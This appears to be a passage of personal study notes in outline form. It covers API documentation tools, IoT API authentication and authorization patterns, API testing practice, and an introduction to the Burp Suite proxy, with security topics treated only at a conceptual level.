&nbsp;			§ Can be required (must be provided for the API to work) or optional (used for filtering, refining results, etc.).

&nbsp;			§ Documentation requirement:

&nbsp;				□ List all parameters.

&nbsp;				□ Describe their purpose and usage.

&nbsp;				□ Clearly mark whether each is required or optional.

&nbsp;		○ Headers

&nbsp;			§ Similar to parameters, using key–value pairs.

&nbsp;			§ Carry metadata about the request (e.g., content type, authorization tokens, caching directives).

&nbsp;			§ Sent along with requests to help servers interpret or validate the call.

&nbsp;			§ Documentation requirement: Must include all headers used, their purpose, and example values.



Request and Response

&nbsp;	• API documentation must clearly explain the request and response structure, including attributes, examples, and error/success codes. Well-written, simple, and interactive documentation improves usability and developer experience.

&nbsp;	• Key Concepts

&nbsp;		○ Request Body

&nbsp;			§ Contains attributes with assigned values that are required to make an API call.

&nbsp;			§ Each attribute should have a short description explaining its purpose.

&nbsp;			§ Documentation should clearly list all attributes that make up the request body.

&nbsp;		○ Response Body

&nbsp;			§ Shows the output returned after sending a request.

&nbsp;			§ Documentation should include example responses so consumers know what to expect.

&nbsp;		○ Success and Error Codes

&nbsp;			§ Must list possible status codes (e.g., 200 OK, 400 Bad Request, 401 Unauthorized, 500 Server Error).

&nbsp;			§ Each code should have a short explanation of its meaning.

&nbsp;			§ Helps developers troubleshoot and handle errors properly.

&nbsp;		○ Best Practices for Documentation

&nbsp;			§ Keep language simple and easy to understand.

&nbsp;			§ Organize content well; avoid unnecessary technical jargon.

&nbsp;			§ Prefer auto-generated documentation to stay up to date with the latest API changes.

&nbsp;			§ Provide interactive features (e.g., “Try it out” options) to let developers test API calls directly.



#### Integrating Documentation with API Tools



Swagger

&nbsp;	• Swagger is one of the most popular tools for creating API documentation. Its strength lies in auto-generating documentation from code, keeping it up to date, and making it interactive so developers can try out APIs directly.

&nbsp;	• Key Concepts

&nbsp;		○ Autogenerated Documentation

&nbsp;			§ Swagger can generate documentation directly from code.

&nbsp;			§ Ensures the documentation is always current with the latest changes.

&nbsp;			§ Saves time and effort compared to writing docs manually.

&nbsp;		○ User-Friendly Interface

&nbsp;			§ Swagger UI (example: petstore.swagger.io) is clean and well-organized.

&nbsp;			§ Uses color coding for HTTP methods:

&nbsp;				□ GET → Blue

&nbsp;				□ POST → Green

&nbsp;				□ PUT → Yellow

&nbsp;				□ DELETE → Red

&nbsp;			§ Endpoints are expandable/collapsible, making navigation easier.

&nbsp;		○ Comprehensive Endpoint Details

&nbsp;			§ Expanding an endpoint shows:

&nbsp;				□ Parameters

&nbsp;				□ Request body

&nbsp;				□ Example values

&nbsp;				□ Success \& error codes

&nbsp;			§ All previously discussed API documentation components (name, description, parameters, headers, request/response, etc.) are included.

&nbsp;		○ Interactivity ("Try it out")

&nbsp;			§ Developers can execute API calls directly in the documentation.

&nbsp;			§ Example: Adding a new pet → sending request with attributes (ID, category, name, etc.) → getting a live response (200 success).

&nbsp;			§ Ability to test endpoints like "Find pet by ID" demonstrates real-time functionality.

&nbsp;		○ Consumer Benefits

&nbsp;			§ Makes documentation hands-on and engaging.

&nbsp;			§ Helps developers quickly see how an API works and decide if it fits their use case.

&nbsp;			§ Reduces onboarding time and increases consumer satisfaction.



Postman

&nbsp;	• Postman is widely known as an API testing tool, but it also has strong built-in features for generating API documentation. It allows documentation at both the individual request level and the collection level, making it easy to provide comprehensive API reference material.

&nbsp;	• Key Concepts

&nbsp;		○ Documentation for Individual Requests

&nbsp;			§ Each API request in Postman (e.g., a GET request) can have its own attached documentation.

&nbsp;			§ Accessed via a paper icon on the right side of the request.

&nbsp;			§ Displays complete details of the request: method, parameters, headers, etc.

&nbsp;		○ Documentation for Entire Collections

&nbsp;			§ Postman supports documenting not just single requests but the whole collection of related API calls.

&nbsp;			§ Users can generate and view full API documentation with a single link.

&nbsp;			§ The collection-level docs show:

&nbsp;				□ Endpoints

&nbsp;				□ Descriptions

&nbsp;				□ Parameters \& headers

&nbsp;				□ Authorization details

&nbsp;				□ Request \& response body

&nbsp;				□ Success and error codes

&nbsp;		○ Code Snippets

&nbsp;			§ Postman offers the ability to add code snippets in different programming languages.

&nbsp;			§ This feature helps developers see how to call the API directly in their preferred language.

&nbsp;		○ Strengths of Postman Documentation

&nbsp;			§ Combines API testing + documentation in one tool.

&nbsp;			§ Documentation is integrated and updated alongside API requests.

&nbsp;			§ Provides a clear, structured view for developers to understand how APIs work.



Confluence

&nbsp;	• Confluence is a strong tool for documenting internal APIs, especially those shared across teams. It allows manual organization of API documentation into structured pages (objects, endpoints, attributes, etc.), but it can also leverage OpenAPI specs for automated, interactive documentation.

&nbsp;	• Key Concepts

&nbsp;		○ Use Case

&nbsp;			§ Best suited for internal API documentation shared within teams.

&nbsp;			§ Helps organize API knowledge in a collaborative workspace.

&nbsp;		○ Structure in Confluence

&nbsp;			§ Pages per object: Each API object (e.g., Product) gets its own page.

&nbsp;			§ Endpoints: Listed under the object with links to details.

&nbsp;				□ Examples: Get all products, Add new product, Fetch product by ID.

&nbsp;			§ Attributes: Documented with details such as:

&nbsp;				□ Data type

&nbsp;				□ Required/optional

&nbsp;				□ Short description

&nbsp;			§ Endpoint Documentation

&nbsp;				□ Each endpoint (e.g., POST for creating a product) includes:

&nbsp;					® Short description of functionality

&nbsp;					® Endpoint URL

&nbsp;					® Parameters and headers (with required/optional tags)

&nbsp;					® Success and error codes, with explanations and possible solutions

&nbsp;					® Example request and response bodies

&nbsp;					® Code snippets in multiple programming languages

&nbsp;		○ Manual vs. Automated Documentation

&nbsp;			§ Typically documentation is manually created in Confluence.

&nbsp;			§ But if an OpenAPI spec (JSON/YAML) is available, Confluence can support auto-generated interactive documentation.

&nbsp;		○ Other Tools

&nbsp;			§ Besides Confluence, other API documentation tools include:

&nbsp;				□ Redocly

&nbsp;				□ Stoplight

&nbsp;				□ ReadMe

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### &nbsp;		○ Use precondition headers with ETags:

&nbsp;			§ Update: If-Matches (reject with 412 if the stored ETag changed).

&nbsp;			§ Create: If-None-Match: \* to prevent overwriting newer versions.

&nbsp;		○ Last-Modified / If-Unmodified-Since also work (coarser granularity).

&nbsp;		○ For end-to-end paths, embed headers + method + body into an encrypted request object (e.g., CBOR + CryptoBox). On receipt:

&nbsp;			§ Decrypt \& verify.

&nbsp;			§ Enforce that actual HTTP method/headers match the request object (don’t let objects override transport metadata).

&nbsp;	• OAuth2 adapted to IoT

&nbsp;		○ Device Authorization Grant (device flow):

&nbsp;			§ Device starts flow → gets device\_code, short user\_code, verification\_uri.

&nbsp;			§ Shows user\_code/QR to user; user approves on phone/PC.

&nbsp;			§ Device polls token endpoint; handles authorization\_pending, slow\_down, access\_denied, expired\_token.

&nbsp;		○ ACE-OAuth (OAuth for constrained envs):

&nbsp;			§ CoAP + CBOR + COSE; PoP tokens by default (bound to symmetric or public keys).

&nbsp;			§ Tokens in CWT; APIs get key via introspection or from the token; can combine with OSCORE for protecting API traffic.

&nbsp;		○ Offline authentication \& authorization

&nbsp;			§ Offline user auth: provision short-lived credentials the device can verify locally (e.g., one-time codes/QR with stored hash, or signed tokens bound to a key/cert presented over BLE).

&nbsp;			§ Offline authorization:

&nbsp;				□ Periodically sync policies (XACML or lighter custom format).

&nbsp;				□ Use self-contained tokens with scopes or macaroons (add caveats like expiry, geo-fence, time-box; verify locally). Third-party caveats fit IoT well.

&nbsp;		○ Key terms

&nbsp;			§ Device onboarding: registering device + credentials.

&nbsp;			§ Entity authentication: who sent it and that it’s fresh.

&nbsp;			§ OSCORE: COSE-protected CoAP with HKDF-derived context and replay windows.

&nbsp;			§ Request object: method+headers+body packaged and encrypted as one unit.

&nbsp;			§ Device grant: OAuth flow with user\_code on a second screen/device.

&nbsp;			§ ACE-OAuth: OAuth over CoAP/CBOR with PoP tokens.

&nbsp;			§ Macaroons: bearer tokens with verifiable, append-only caveats.

&nbsp;		○ Practical checklist (opinionated)

&nbsp;			§ If device ↔ API is direct, use TLS/DTLS PSK (or client certs); map PSK ID → device profile → authZ.

&nbsp;			§ Crossing gateways? Add COSE/NaCl end-to-end request protection + freshness (prefer challenge–response or counters).

&nbsp;			§ For CoAP ecosystems, adopt OSCORE; plan for state persistence and replay windows.

&nbsp;			§ For REST mutations, require ETag preconditions; include ETag/method inside request objects and enforce match.

&nbsp;			§ Consumer UX: use OAuth device grant. Constrained stacks: plan ACE-OAuth + PoP.

&nbsp;			§ Offline operation: cache policies/tokens; use macaroons or short-lived PoP tokens; limit offline privileges/time.





--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### API Testing

#### Understanding Web Services and APIs



Introduction to Web Services

&nbsp;	• APIs dominate modern internet traffic (roughly 60–80%), and they connect innumerable web services. Testers need to understand and probe these services effectively.

&nbsp;	• Key Concepts

&nbsp;		○ Definitions

&nbsp;			§ Web service (working definition): A function you can access over the web.

&nbsp;				□ Think function → input → processing → output.

&nbsp;			§ API: The interface to send inputs to a service and receive outputs.

&nbsp;			§ Black-box perspective: Treat the service internals as unknown; evaluate behavior purely via inputs/outputs.

&nbsp;			§ Service scope varies:

&nbsp;				□ Tiny, single-purpose endpoints (e.g., a math evaluator like MathJS).

&nbsp;				□ Full applications with many interrelated features.

&nbsp;				□ Internal (owned by your org) vs external (third-party) services.

&nbsp;		○ Testing implications

&nbsp;			§ Use black-box testing techniques: design input cases, observe outputs, infer behavior/bugs without relying on implementation details.

&nbsp;			§ Adjust approach based on service scope (small utility vs complex app) and ownership (internal vs external).

&nbsp;			§ Focus on request/response contracts: inputs, validation, error handling, and output correctness.



Types of APIs

&nbsp;	• different types of APIs—REST, SOAP, and GraphQL—explaining their principles, differences, and practical use cases. It highlights how APIs define the structure of requests and responses, and how developers/testers interact with them.

&nbsp;	• Key Concepts

&nbsp;		○ REST APIs (Representational State Transfer)

&nbsp;			§ Originated from Roy Fielding’s doctoral thesis.

&nbsp;			§ Principles: Simple, consistent, and resource-based design.

&nbsp;			§ Characteristics:

&nbsp;				□ Most common style in modern APIs.

&nbsp;				□ Uses HTTP methods (GET, POST, PUT, DELETE).

&nbsp;				□ Typically returns JSON.

&nbsp;			§ Takeaway: If you’re unsure what type of API you’re working with, REST is the most likely.

&nbsp;		○ SOAP APIs (Simple Object Access Protocol)

&nbsp;			§ Older but still used in many systems.

&nbsp;			§ Highly standardized with rules defined by WSDL (Web Services Description Language).

&nbsp;			§ Uses XML for both requests and responses.

&nbsp;			§ Requires strict request formatting (headers, content types, and body structure).

&nbsp;			§ Requests usually sent with POST.

&nbsp;			§ Takeaway: SOAP enforces consistency but is more rigid and verbose compared to REST.

&nbsp;		○ GraphQL

&nbsp;			§ Created by Facebook (Meta) in 2015, growing in popularity.

&nbsp;			§ Query Language for APIs → gives clients fine-grained control over the data requested.

&nbsp;			§ Features:

&nbsp;				□ Single endpoint (unlike REST which often has many).

&nbsp;				□ Clients specify exactly what data they need → reduces over-fetching/under-fetching.

&nbsp;				□ Example: Request only country name and capital, excluding currency if not needed.

&nbsp;			§ Takeaway: GraphQL is flexible and efficient, letting clients shape the response to their exact needs.

&nbsp;		○ Practical Testing/Usage Notes

&nbsp;			§ REST → easy, common, loosely standardized.

&nbsp;			§ SOAP → structured, XML-based, requires strict adherence to WSDL.

&nbsp;			§ GraphQL → highly flexible, query-driven, single endpoint, selective data retrieval.

&nbsp;		○ Overall Takeaway

&nbsp;			§ There are multiple API paradigms, each with trade-offs:

&nbsp;				□ REST = simplicity and ubiquity.

&nbsp;				□ SOAP = rigid structure and enterprise legacy systems.

&nbsp;				□ GraphQL = flexibility and precision for modern data-driven apps.

#### Getting Started with API Testing



Risk of using Services and APIs

&nbsp;	• API testing is fundamentally about risk reduction. APIs introduce unique risks—such as version changes, availability issues, timing problems, performance bottlenecks, and security vulnerabilities—that testers must anticipate and mitigate.

&nbsp;	• Key Concepts

&nbsp;		○ API Changes

&nbsp;			§ Public APIs: Generally stable, but version upgrades can break existing integrations.

&nbsp;			§ Private APIs: May change frequently without strict versioning (e.g., endpoint names, request/response data), requiring constant test updates.

&nbsp;			§ Any change can introduce bugs even if the interface looks the same.

&nbsp;		○ Availability Risks

&nbsp;			§ Network issues: Flaky internet can impact API reliability.

&nbsp;			§ Permissions: Must enforce correct access control. Testing should check both sides:

&nbsp;				□ Authorized users can access only what they should.

&nbsp;				□ Unauthorized users cannot see restricted data.

&nbsp;		○ Timing Risks

&nbsp;			§ Order of requests: Network glitches or race conditions may cause out-of-order execution.

&nbsp;			§ Slow calls / timeouts: Need to test how APIs handle delays.

&nbsp;			§ Concurrency: Multiple users modifying the same resource simultaneously may lead to conflicts.

&nbsp;		○ Performance Risks

&nbsp;			§ APIs can be hit faster than human-driven UIs since they’re programmatic.

&nbsp;			§ Rate limiting: Prevents abuse by limiting request frequency.

&nbsp;			§ Without rate limiting: Malicious actors or buggy code could overload the system with a spike of requests.

&nbsp;		○ Security Risks

&nbsp;			§ APIs are common attack vectors because they’re easy to interact with via scripts.

&nbsp;			§ Risks include unauthorized access, injection attacks, or denial of service through traffic spikes.

&nbsp;			§ Even if not doing full penetration testing, testers should remain aware of security concerns.

#### API Authorization



Overview of Authorization and Authentication

&nbsp;	• APIs must be secured, and testers need to understand authentication and authorization in order to properly access and test API endpoints. These are distinct but often combined in practice.

&nbsp;	• Key Concepts

&nbsp;		○ API Security Challenges

&nbsp;			§ APIs are exposed to programmatic attacks, so security is critical.

&nbsp;			§ For testers, security adds complexity → must learn how to authenticate and authorize before testing endpoints.

&nbsp;			§ Testers should also validate that the security mechanisms themselves work as intended.

&nbsp;		○ Authentication

&nbsp;			§ Definition: Verifies who you are.

&nbsp;			§ Analogy: Showing an ID at a rental car counter.

&nbsp;			§ Failure case: If your ID doesn’t match you → you fail authentication.

&nbsp;			§ API context: Ensures the requester’s identity is valid (e.g., via username/password, tokens, or certificates).

&nbsp;		○ Authorization

&nbsp;			§ Definition: Verifies what you can do.

&nbsp;			§ Analogy: Even if the ID is valid, if you don’t have a reservation, you’re not allowed to rent the car.

&nbsp;			§ Failure case: Authenticated user but no permission for the requested action.

&nbsp;			§ API context: Controls access rights to specific actions or resources.



Basic Authorization in API calls

&nbsp;	• Basic authentication (Basic Auth) is one of the simplest ways to authenticate with an API. It works by sending a username and password in an Authorization header using Base64 encoding, but it has significant security risks if not used over a secure connection (HTTPS).

&nbsp;	• Key Concepts

&nbsp;		○ Basic Auth Mechanism

&nbsp;			§ Similar to logging into a website with a username and password.

&nbsp;			§ Sent in the Authorization header:

&nbsp;				Authorization: Basic <base64(username:password)>

&nbsp;			§ Example: username=postman, password=password → base64 encoded → placed after the word “Basic”.

&nbsp;		○ Base64 Encoding

&nbsp;			§ Base64 is not encryption, just an encoding scheme.

&nbsp;			§ Easy to decode (trivial for anyone intercepting traffic).

&nbsp;			§ Example shown with decoding a header string to reveal the raw credentials.

&nbsp;			§ Risk: If traffic is not encrypted (no HTTPS), credentials can be stolen easily.

&nbsp;		○ Security Considerations

&nbsp;			§ Must use HTTPS when using Basic Auth to protect credentials in transit.

&nbsp;			§ Avoid sending sensitive credentials in plaintext.

&nbsp;			§ For stronger security, consider more robust authentication methods (OAuth, API keys, tokens, etc.).

&nbsp;		○ Postman Demonstration

&nbsp;			§ Postman automates header creation when using its Authorization tab.

&nbsp;			§ Manual method: User can create their own Authorization header by encoding username:password into Base64 and appending it.

&nbsp;			§ Verified by sending a request and receiving authenticated = true.

&nbsp;		○ General API Call Data Transmission

&nbsp;			§ Data in an API call can be transmitted in three main ways:

&nbsp;				□ URL parameters (query strings).

&nbsp;				□ Request body (payload).

&nbsp;				□ Headers (metadata, including authentication).

&nbsp;			§ Authentication data always travels through one of these channels.



Using Authorization Tokens

&nbsp;	• Instead of using basic authentication, modern APIs often use authorization tokens. Tokens securely combine authentication (who you are) and authorization (what you can do) into one mechanism, making them more flexible and secure for API interactions.

&nbsp;	• Key Concepts

&nbsp;		○ Authorization Tokens

&nbsp;			§ Definition: A server-issued credential proving both identity and permissions.

&nbsp;			§ Anyone presenting the token can perform the actions that token allows.

&nbsp;			§ More secure and flexible than Basic Auth, since tokens can:

&nbsp;				□ Expire (time-limited).

&nbsp;				□ Be scoped to specific actions/endpoints (e.g., read, create, but not delete).

&nbsp;		○ Example: GitHub Personal Access Token

&nbsp;			§ Generated in GitHub Developer Settings.

&nbsp;			§ Can set expiration and scope (permissions) when creating the token.

&nbsp;			§ Example:

&nbsp;				□ Token allowed: read repos, create repos.

&nbsp;				□ Token denied: deleting repos → results in forbidden (403) error.

&nbsp;		○ Bearer Tokens in Practice

&nbsp;			§ Used in Authorization header like:

&nbsp;				Authorization: Bearer <token>

&nbsp;			§ Postman automatically adds this header when configured.

&nbsp;			§ Works similarly to Basic Auth header but much more secure and flexible.

&nbsp;		○ Usage Flow

&nbsp;			§ Generate token from service (GitHub in this case).

&nbsp;			§ Add token to Postman’s Bearer Token field.

&nbsp;			§ Make requests:

&nbsp;				□ GET repos → works (authorized).

&nbsp;				□ POST new repo → works (authorized).

&nbsp;				□ DELETE repo → fails (not authorized, scope excluded).



Finsing Bearer Tokens

&nbsp;	• APIs commonly use tokens for authentication/authorization, but the way you obtain and use these tokens varies across APIs. Testers and developers need to know common patterns, read documentation, and sometimes inspect traffic to figure out how tokens are issued and passed in requests.

&nbsp;	• Key Concepts

&nbsp;		○ How to Get Tokens

&nbsp;			§ Account/Form-based: Many APIs require creating an account or filling out a form to request a token (e.g., IUCN Threatened Species API).

&nbsp;			§ Direct provision: Some APIs provide sample tokens in documentation for testing.

&nbsp;			§ OAuth workflow: Common approach where you exchange a client ID and client secret for a token (e.g., Petfinder API).

&nbsp;		○ How Tokens Are Used in Requests

&nbsp;			§ Query string parameters: Rare, but some APIs place tokens directly in the URL (unusual and less secure).

&nbsp;			§ Headers (most common): Tokens usually passed via the Authorization header as a Bearer token.

&nbsp;			§ Custom headers: Some APIs define their own headers (e.g., X-Api-Key in The Dog API). Prefix X- is common but not required.

&nbsp;		○ Common Patterns in API Token Use

&nbsp;			§ Consistency varies: Each API can implement tokens differently—no universal rule.

&nbsp;			§ Documentation is key: Must read the API docs to know whether the token belongs in the header, body, or URL.

&nbsp;			§ Inspecting network traffic: Developer tools can reveal where tokens are being sent (e.g., Dog API’s X-Api-Key header).

&nbsp;			§ OAuth (Client ID + Secret exchange): A standardized scheme widely adopted for securely issuing tokens.



Setting up Oauth

&nbsp;	• explains how OAuth 2.0 works in practice, using the Imgur API as an example. OAuth is a widely used authentication and authorization framework that enables secure access to APIs (e.g., “Login with Google”). It involves registering an application, obtaining authorization from the user, and exchanging authorization codes for access tokens.

&nbsp;	• Key Concepts

&nbsp;		○ OAuth 2.0 Basics

&nbsp;			§ Purpose: Allows applications to securely access user data without sharing passwords directly.

&nbsp;			§ Common Usage: "Login with Google" or "Login with Facebook."

&nbsp;			§ Mechanism: Uses tokens (not credentials) to authenticate and authorize access.

&nbsp;		○ Registering an Application

&nbsp;			§ Developers must register their app with the API provider (e.g., Imgur).

&nbsp;			§ Registration requires:

&nbsp;				• Application name.

&nbsp;				• Callback/redirect URL (where users are sent after logging in).

&nbsp;				• Client ID and Client Secret (credentials identifying the app).

&nbsp;		○ OAuth Authorization Code Flow

&nbsp;			§ Step 1: Application requests access from the Authorization Server.

&nbsp;			§ Step 2: User is prompted to log in and consent.

&nbsp;			§ Step 3: Authorization server issues a short-lived authorization code.

&nbsp;			§ Step 4: Application exchanges that code at the /token endpoint with its Client ID + Secret to receive an access token.

&nbsp;			§ Step 5: Application uses the access token to call API endpoints on behalf of the user.

&nbsp;		○ Key Terms

&nbsp;			§ Authorization Server: System that validates user identity and issues tokens.

&nbsp;			§ Client ID \& Secret: Identifiers for the app making the request.

&nbsp;			§ Authorization Code: Temporary code proving user consent.

&nbsp;			§ Access Token: Credential allowing the app to interact with the API.

#### Additional API Testing Consideration



Using Mocks, Stubs, and Fakes, in API Testing

&nbsp;	• Mocks, stubs, and fakes (test doubles) are tools that let testers replace real system components with simulated ones during API testing. They make it easier to isolate and test specific parts of an API when the real dependencies are unavailable, unreliable, or would interfere with others.

&nbsp;	• Key Concepts

&nbsp;		○ Test Doubles

&nbsp;			§ Just like a stunt double in movies, test doubles stand in for real parts of the system during testing.

&nbsp;			§ These include mocks, stubs, and fakes, which all replace or simulate real implementations.

&nbsp;		○ Mocks

&nbsp;			§ Replace real implementations with fake ones.

&nbsp;			§ Useful when you need data from another system (e.g., third-party API) that you can’t or don’t want to call in a test environment.

&nbsp;			§ Example: Create a mock server in Postman to return a predefined response (like an empty list for a to-do app).

&nbsp;		○ Benefits of Using Mocks, Stubs, and Fakes

&nbsp;			§ Isolation: Test one part of a system without depending on external services.

&nbsp;			§ Controlled scenarios: Simulate specific situations that might be hard to reproduce (e.g., empty dataset, error response).

&nbsp;			§ Safe testing: Avoid disrupting shared test environments or external services.

&nbsp;		○ Cautions \& Limitations

&nbsp;			§ Using a fake implementation means you’re not testing the real system, so bugs may be missed.

&nbsp;			§ Test doubles should be balanced with real-world tests to ensure accuracy.

&nbsp;			§ They are powerful tools, but must be used thoughtfully and not as a replacement for real integration testing.



API Automation

&nbsp;	• API testing benefits hugely from automation, but automation and exploratory testing serve different goals. Use exploration to discover what matters; use automation to repeatedly check what must remain true.

&nbsp;	• Key Concepts

&nbsp;		○ Exploration vs. Automation

&nbsp;			§ Exploration: discovery, learning, finding new risks/behaviors.

&nbsp;			§ Automation: repetition to catch regressions; validates known, important behaviors.

&nbsp;		○ What to automate

&nbsp;			§ Stable contracts/things that shouldn’t change (endpoints, schemas, status codes).

&nbsp;			§ Signals you care about if they change (auth flows, critical workflows, response shapes).

&nbsp;			§ Aim for tests whose failures are actionable, not churn from expected evolution.

&nbsp;		○ Two common automation approaches

&nbsp;			§ Data-driven

&nbsp;				□ Sweep endpoints/parameters, validate responses broadly.

&nbsp;				□ Pros: wide coverage.

&nbsp;				□ Cons: can be slow, brittle, and high-maintenance if schemas/inputs evolve.

&nbsp;			§ Workflow-driven

&nbsp;				□ Chain calls to mimic real user/business flows.

&nbsp;				□ Pros: realistic, catches integration issues.

&nbsp;				□ Cons: need to pass state between steps; more orchestration logic.

&nbsp;		○ Design \& maintainability principles

&nbsp;			§ Treat suites like code: DRY helpers, shared fixtures, good naming, encapsulated data/setup.

&nbsp;			§ Prefer low-flakiness tests; isolate side effects; control test data.

&nbsp;			§ Be deliberate: not everything explored should be automated; optimize for long-term value.



Performance Testing

&nbsp;	• Performance testing helps evaluate how well an API (and the system it supports) behaves under different conditions, such as speed, load, and stress. APIs are powerful tools for performance testing because they allow programmatic, repeatable, and scalable test setups.

&nbsp;	• Key Concepts

&nbsp;		○ Performance Testing as a Broad Category

&nbsp;			§ Includes multiple forms of testing:

&nbsp;				□ Speed testing → How fast does a response come back?

&nbsp;				□ Load testing → How many requests per second/minute can the system handle?

&nbsp;				□ Stress testing → How does the system behave under extreme load or large datasets?

&nbsp;				□ Other related scenarios (scalability, concurrency, endurance).

&nbsp;		○ Using APIs for Load/Stress Testing

&nbsp;			§ APIs let you quickly generate large datasets without manual input.

&nbsp;			§ Example: Stress-testing a ToDo app by creating hundreds/thousands of tasks programmatically.

&nbsp;			§ Benefits:

&nbsp;				□ Saves time (no manual repetition).

&nbsp;				□ Creates controlled load conditions for testing.

&nbsp;			§ Can be done with scripts (Python + requests library) or tools like Postman.

&nbsp;		○ Using APIs for Speed Testing

&nbsp;			§ Measure response times by sending requests repeatedly.

&nbsp;			§ Collect statistics such as average runtime or distribution of response times.

&nbsp;			§ Can be done in:

&nbsp;				□ Postman (shows request time).

&nbsp;				□ Custom scripts (e.g., Python).

&nbsp;				□ Specialized tools (e.g., Apache JMeter) for deeper analysis.

&nbsp;		○ General Guidance

&nbsp;			§ APIs provide a realistic but programmatic entry point to test performance.

&nbsp;			§ Performance testing should go beyond just functional correctness → focus on scalability, efficiency, and robustness under load.

&nbsp;			§ The examples shown (scripts, Postman) are starting points; dedicated tools like JMeter are better for larger, more complex testing.



Security Testing

&nbsp;	• Security testing is critical for APIs. Authentication and authorization are important, but they are only part of the picture. APIs are a common attack surface, so testing must consider vulnerabilities like injection, input validation, and responsibility overlap between layers.

&nbsp;	• Key Concepts

&nbsp;		○ Don’t Reinvent Authentication/Authorization

&nbsp;			§ Use standard, proven auth protocols (OAuth, OpenID Connect, etc.).

&nbsp;			§ Rolling your own solution is error-prone unless you have the scale/resources of companies like Google.

&nbsp;		○ APIs as Attack Surfaces

&nbsp;			§ Attackers often target APIs because they are:

&nbsp;				□ Programmatic (easy to automate attacks).

&nbsp;				□ Central gateways to system data and logic.

&nbsp;			§ Common vulnerabilities:

&nbsp;				□ SQL Injection (SQLi)

&nbsp;				□ Cross-Site Scripting (XSS)

&nbsp;				□ Others like command injection, insecure direct object references.

&nbsp;		○ Shared Responsibilities

&nbsp;			§ Some vulnerabilities (e.g., XSS) can be mitigated at UI or API level.

&nbsp;			§ When responsibility overlaps, risk of gaps increases—must verify someone handles it.

&nbsp;		○ Input Validation

&nbsp;			§ APIs must enforce strict validation of inputs.

&nbsp;			§ Fuzzing (sending random/invalid inputs) is a common attacker technique.

&nbsp;			§ Example: If an API expects an integer, it should reject non-integers consistently.

&nbsp;		○ Security Testing Mindset

&nbsp;			§ Security testing is a specialized field, but testers should still:

&nbsp;				□ Be aware of common vulnerabilities.

&nbsp;				□ Try simple attacks (e.g., fuzzing, injection attempts).

&nbsp;				□ Verify enforcement of validation and authorization.

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Burp Suite

#### Burp Suite Basics





What is Burp Suite?

&nbsp;	• Burp Suite is the industry-standard tool for professional web penetration testing, providing a complete and extensible framework to test modern web applications, portals, and APIs for vulnerabilities.

&nbsp;	• Key Concepts

&nbsp;		○ Context of Use

&nbsp;			§ Most modern applications are accessed through web portals (cloud services, on-prem apps, REST APIs).

&nbsp;			§ This makes web-based penetration testing a major focus for security testers.

&nbsp;		○ Need for Specialized Tools

&nbsp;			§ Web protocols (HTTP, HTTPS, REST) require tools that can:

&nbsp;				□ Understand and manipulate traffic.

&nbsp;				□ Detect vulnerabilities.

&nbsp;				□ Automate scanning.

&nbsp;		○ Comparison with Other Tools

&nbsp;			§ Simple scanners like Whatweb.

&nbsp;			§ Open-source tools like OWASP ZAP.

&nbsp;			§ But the preferred tool for professionals is Burp Suite.

&nbsp;		○ Capabilities of Burp Suite

&nbsp;			§ Web scanning: Find vulnerabilities in applications.

&nbsp;			§ Spidering: Crawl and discover all pages of a website.

&nbsp;			§ Proxying: Intercept and manipulate traffic between client and server.

&nbsp;			§ Message creation \& replay: Craft and send test inputs to web apps.

&nbsp;		○ Editions of Burp Suite

&nbsp;			§ Community Edition (Free): Limited features, but still powerful for beginners.

&nbsp;			§ Professional Edition: Full capabilities for pen testers.

&nbsp;			§ Enterprise Edition: Includes everything in Professional + integration into DevOps workflows for large organizations.





Getting to Know Burp Suite

&nbsp;	• This section introduces Burp Suite’s Community Edition interface and features, walking through its dashboard, target and proxy functions, and basic setup. It highlights the differences between the Community and Professional editions and explains how Burp Suite captures, filters, and manipulates traffic for penetration testing.

&nbsp;	• Key Concepts

&nbsp;		○ Starting Burp Suite

&nbsp;			§ Community Edition in Kali Linux: Found under Web Application Analysis.

&nbsp;			§ Temporary vs Persistent Projects:

&nbsp;				□ Community Edition only supports temporary projects.

&nbsp;				□ Professional Edition allows storing projects on disk (needed for full client work).

&nbsp;			§ Default startup: Temporary project + default settings.

&nbsp;		○ Interface Overview

&nbsp;			§ Menu items: Burp, Intruder, Repeater, Window, Help.

&nbsp;			§ Activity Ribbon: Quick access to Burp tasks and actions.

&nbsp;			§ Context Menus: Multiple ways to perform tasks; users develop their own workflow style.

&nbsp;		○ Dashboard

&nbsp;			§ Panels: Tasks, Event Logs, Issue Activity, Advisory Panel.

&nbsp;			§ Community Edition limitations: Only passive crawling is supported; no active scanning.

&nbsp;			§ Tasks and status buttons: Configure live tasks, scope, and scan settings.

&nbsp;		○ Target Functions

&nbsp;			§ Site Map: Displays target web-tree, requests/responses, and message exchanges.

&nbsp;			§ Inspector Panel: Extracts key details from messages for quicker review.

&nbsp;			§ Scope Settings: Define which URLs/traffic are in-scope, reducing noise.

&nbsp;			§ Issue Definitions: Built-in vulnerability references.

&nbsp;		○ Proxy Functions

&nbsp;			§ Components: Intercept, HTTP History, WebSockets History, Options.

&nbsp;			§ Intercept: Hold, modify, forward, or drop requests/responses.

&nbsp;			§ HTTP History: Logs all HTTP traffic (in/out of scope).

&nbsp;			§ WebSockets History: Logs real-time JSON packet exchanges in modern apps.

&nbsp;			§ Options:

&nbsp;				□ Set listening ports (default 8080).

&nbsp;				□ Configure which messages to intercept (requests, responses, WebSockets).

&nbsp;				□ Option to unhide hidden fields in responses.

&nbsp;				□ Match/replace rules for automated modifications.

&nbsp;		○ Advanced Features

&nbsp;			§ Multi-proxying: Burp can handle multiple listening proxies for complex setups.

&nbsp;			§ Collaboration Server (Professional Edition):

&nbsp;				□ Used for advanced testing like blind SQL injection.

&nbsp;				□ By default uses PortSwigger’s public server, but private servers can be configured.



Proxying Web Traffic

&nbsp;	• Burp Suite acts as a proxy tool that allows penetration testers to intercept, inspect, and manipulate web traffic between a browser (or mobile device) and a web application. Setting up a browser or device to route traffic through Burp Suite enables deeper analysis of requests and responses.

&nbsp;	• Key Concepts

&nbsp;		○ What Proxying Means

&nbsp;			§ Normally: Browser → Website directly.

&nbsp;			§ With Burp Suite: Browser → Burp Suite Proxy → Website.

&nbsp;			§ This enables testers to:

&nbsp;				□ Inspect requests and responses.

&nbsp;				□ Modify messages before they reach the server.

&nbsp;				□ Inject new traffic for testing.

&nbsp;		○ Using Burp Suite’s Built-in Brows

&nbsp;			§ Burp Suite includes its own browser pre-configured to work with its proxy.

&nbsp;			§ This avoids the need for manual setup.

